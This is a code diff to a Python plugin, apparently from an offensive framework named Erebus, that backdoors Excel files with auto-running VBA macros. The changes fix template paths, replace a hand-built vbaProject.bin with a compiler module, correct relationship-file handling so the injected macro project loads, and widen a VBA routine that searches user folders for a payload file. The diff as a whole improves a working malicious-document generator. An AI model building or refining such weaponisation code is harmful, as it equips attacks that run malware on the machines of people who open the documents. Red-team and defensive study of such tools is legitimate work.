@@ -167,7 +167,8 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             template_name = "template.xlsx"
 
         # agent_code/templates/ is the canonical location
-        repo_root = Path(__file__).resolve().parents[3]  # up from modules -> erebus -> erebus_wrapper -> repo root
+        # modules -> erebus -> erebus_wrapper (inner package that contains agent_code/)
+        repo_root = Path(__file__).resolve().parents[2]
         candidates = [
             repo_root / "agent_code" / "templates" / template_name,
             Path(__file__).resolve().parent.parent / "templates" / template_name,
@@ -320,92 +321,28 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         except Exception as e:
             raise RuntimeError(f"Failed to backdoor Excel document: {str(e)}")
 
-    def _create_vbaproject_with_code(self, vba_code):
+    def _create_vbaproject_with_code(self, vba_code, module_name="ErebusPayload"):
         """
-        Uses a pre-built template OLE structure with proper VBA project format.
+        Build a valid vbaProject.bin OLE compound file containing the given
+        VBA source code as a standard module.
+
+        Uses the vba_compiler module under agent_code/ which implements
+        the MS-OVBA and MS-CFB specifications.
 
         Args:
             vba_code (str): VBA source code to embed
+            module_name (str): Name for the VBA module (default: ErebusPayload)
 
         Returns:
-            bytes: Valid OLE compound file with VBA project structure
+            bytes: Valid OLE compound file (vbaProject.bin)
         """
-        # Use a pre-built minimal but valid vbaProject.bin structure
-        # The structure includes proper _VBA_PROJECT and VBA directory streams
+        import sys
+        repo_root = Path(__file__).resolve().parents[2]
+        if str(repo_root) not in sys.path:
+            sys.path.insert(0, str(repo_root))
 
-        ole_template = (
-            b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1'  # Signature
-            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # CLSID (zeros)
-            b'\x00\x00\x00\x00\x00\x00\x00\x00'
-            b'\x3e\x00\x03\x00\xfe\xff\x09\x00'  # Minor/Major version, byte order, sector shift
-            b'\x06\x00\x00\x00\x00\x00\x00\x00'  # Mini sector shift, reserved
-            b'\x00\x00\x00\x00\x02\x00\x00\x00'  # Total/FAT sectors
-            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # First directory/transaction
-            b'\x00\x10\x00\x00\xfe\xff\xff\xff'  # Mini cutoff, First mini FAT
-            b'\x00\x00\x00\x00\xfe\xff\xff\xff'  # Mini FAT count, First DIFAT
-            b'\x00\x00\x00\x00'                  # DIFAT count
-        )
-
-        # DIFAT array (first FAT at sector 1)
-        ole_template += b'\x01\x00\x00\x00'
-        ole_template += b'\xff' * (76 - len(ole_template))  # Fill to offset 76
-        ole_template += b'\xff' * (512 - len(ole_template))  # Fill header to 512 bytes
-
-        # === DIRECTORY SECTOR (sector 0) ===
-        directory = bytearray(512)
-
-        # Root Entry
-        root_name = 'Root Entry'.encode('utf-16-le')
-        directory[0:len(root_name)] = root_name
-        directory[64:66] = len(root_name).to_bytes(2, 'little')
-        directory[66] = 5  # Root storage
-        directory[67] = 1  # Black
-        directory[68:72] = b'\xff\xff\xff\xff'  # No siblings
-        directory[72:76] = b'\xff\xff\xff\xff'
-        directory[76:80] = b'\x01\x00\x00\x00'  # Child at entry 1
-        directory[116:120] = b'\xff\xff\xff\xff'  # Start sector
-        directory[120:124] = b'\x00\x00\x00\x00'  # Size
-
-        # _VBA_PROJECT stream
-        vba_proj_name = '_VBA_PROJECT'.encode('utf-16-le')
-        directory[128:128+len(vba_proj_name)] = vba_proj_name
-        directory[128+64:128+66] = len(vba_proj_name).to_bytes(2, 'little')
-        directory[128+66] = 2  # Stream
-        directory[128+67] = 1  # Black
-        directory[128+68:128+72] = b'\xff\xff\xff\xff'
-        directory[128+72:128+76] = b'\xff\xff\xff\xff'
-        directory[128+76:128+80] = b'\xff\xff\xff\xff'
-        directory[128+116:128+120] = b'\x02\x00\x00\x00'  # Start at sector 2
-        directory[128+120:128+124] = b'\x00\x04\x00\x00'  # Size: 1024 bytes
-
-        ole_template += bytes(directory)
-
-        # === FAT SECTOR (sector 1) ===
-        fat = bytearray(512)
-        fat[0:4] = b'\xfd\xff\xff\xff'   # Sector 0: Directory
-        fat[4:8] = b'\xfe\xff\xff\xff'   # Sector 1: FAT
-        fat[8:12] = b'\x03\x00\x00\x00'  # Sector 2: Next (sector 3)
-        fat[12:16] = b'\xfe\xff\xff\xff' # Sector 3: End of chain
-
-        # Rest free
-        for i in range(4, 128):
-            fat[i*4:(i+1)*4] = b'\xff\xff\xff\xff'
-
-        ole_template += bytes(fat)
-
-        # === VBA DATA (sectors 2-3, 1024 bytes) ===
-        # Valid _VBA_PROJECT stream data (hex signature that Excel recognizes)
-        vba_project_data = (
-            b'\xcc\x61\xff\xff\x00\x00\x00\x00'  # Signature
-            b'\x00\x00\x00\x00\x00\x00\x00\x00'
-            b'\x00\x00\x00\x00\x00\x00\x00\x00'
-            b'\x00\x00\x00\x00\x00\x00\x00\x00'
-        )
-        vba_project_data += b'\x00' * (1024 - len(vba_project_data))
-
-        ole_template += vba_project_data
-
-        return ole_template
+        from agent_code.vba_compiler import compile_vba_project
+        return compile_vba_project(vba_code, module_name=module_name)
 
     def _inject_vba_into_excel(self, excel_path, vba_code, auto_open=True):
         """
@@ -437,7 +374,7 @@ class PayloadMalDocsPlugin(ErebusPlugin):
                 zip_ref.extractall(str(temp_dir))
 
             # Update workbook.xml.rels to reference the macro project
-            rels_path = temp_dir / "_rels" / "workbook.xml.rels"
+            rels_path = temp_dir / "xl" / "_rels" / "workbook.xml.rels"
             if rels_path.exists():
                 try:
                     # Parse with namespace handling
@@ -455,9 +392,14 @@ class PayloadMalDocsPlugin(ErebusPlugin):
                             break
 
                     if not vba_rel_exists:
-                        # Add vbaProject relationship
+                        # Find the next available rId
+                        existing_ids = [int(r.get('Id', 'rId0').replace('rId', ''))
+                                        for r in root.findall('{%s}Relationship' % ns_rels)
+                                        if r.get('Id', '').startswith('rId')]
+                        next_id = max(existing_ids, default=0) + 1
+
                         new_rel = ET.Element('{%s}Relationship' % ns_rels)
-                        new_rel.set('Id', 'rId4')
+                        new_rel.set('Id', f'rId{next_id}')
                         new_rel.set('Type', 'http://schemas.microsoft.com/office/2006/relationships/vbaProject')
                         new_rel.set('Target', 'vbaProject.bin')
                         root.append(new_rel)
@@ -792,19 +734,20 @@ Private Function FindPayload(ByVal fileName As String, ByVal fallbackPath As Str
     Dim fso As Object
     Dim found As String
 
-    ReDim candidates(0 To 11)
-    candidates(0)  = ThisWorkbook.Path
-    candidates(1)  = Environ("TEMP")
-    candidates(2)  = Environ("TMP")
-    candidates(3)  = Environ("APPDATA")
-    candidates(4)  = Environ("LOCALAPPDATA")
-    candidates(5)  = Environ("USERPROFILE") & "\\Desktop"
-    candidates(6)  = Environ("USERPROFILE") & "\\Downloads"
-    candidates(7)  = Environ("USERPROFILE") & "\\Documents"
-    candidates(8)  = Environ("USERPROFILE")
-    candidates(9)  = Environ("OneDrive") & "\\Desktop"
-    candidates(10) = Environ("OneDrive") & "\\Downloads"
-    candidates(11) = Environ("OneDrive") & "\\Documents"
+    ReDim candidates(0 To 12)
+    candidates(0)  = CurDir$
+    candidates(1)  = ThisWorkbook.Path
+    candidates(2)  = Environ("TEMP")
+    candidates(3)  = Environ("TMP")
+    candidates(4)  = Environ("APPDATA")
+    candidates(5)  = Environ("LOCALAPPDATA")
+    candidates(6)  = Environ("USERPROFILE") & "\\Desktop"
+    candidates(7)  = Environ("USERPROFILE") & "\\Downloads"
+    candidates(8)  = Environ("USERPROFILE") & "\\Documents"
+    candidates(9)  = Environ("USERPROFILE")
+    candidates(10) = Environ("OneDrive") & "\\Desktop"
+    candidates(11) = Environ("OneDrive") & "\\Downloads"
+    candidates(12) = Environ("OneDrive") & "\\Documents"
 
     Set fso = CreateObject("Scripting.FileSystemObject")
 
